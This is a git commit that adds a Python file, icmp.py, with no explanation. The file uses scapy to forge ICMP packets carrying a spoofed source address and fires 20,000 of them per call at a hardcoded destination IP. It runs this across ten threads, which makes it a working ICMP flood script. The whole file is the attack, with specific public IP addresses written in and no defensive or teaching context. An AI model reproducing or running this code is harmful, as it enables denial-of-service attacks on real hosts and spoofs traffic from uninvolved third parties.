6dd3c18062df6dee2555f5ed977ed6ec9d565e72
Dawood <dawood.aijaz97@gmail.com>
2019-08-25 18:38:18 +0500

    #

---
+++ icmp.py
@@ -0,0 +1,40 @@
+import sys
+import threading
+from queue import Queue
+from scapy.all import *
+
+
+def launch():
+        p = (IP(src="35.202.52.252", dst="35.193.17.254") / ICMP())
+        send(p, count=20000)
+
+
+NUMBER_OF_WORKERS = 10
+NUMBER_OF_JOBS = 10
+q = Queue()
+
+
+def create_thread():
+    for i in range(NUMBER_OF_WORKERS):
+        t = threading.Thread(target=worker)
+        t.daemon = True
+        t.start()
+
+
+def create_jobs():
+    for my_worker in range(NUMBER_OF_JOBS):
+        q.put(my_worker)
+    q.join()
+
+
+def worker():
+    for x in range(NUMBER_OF_JOBS):
+        my_worker = q.get()  # get job and remove from que
+        launch()
+        q.task_done()  # when task is complete
+
+
+create_thread()
+create_jobs()
+worker()
+
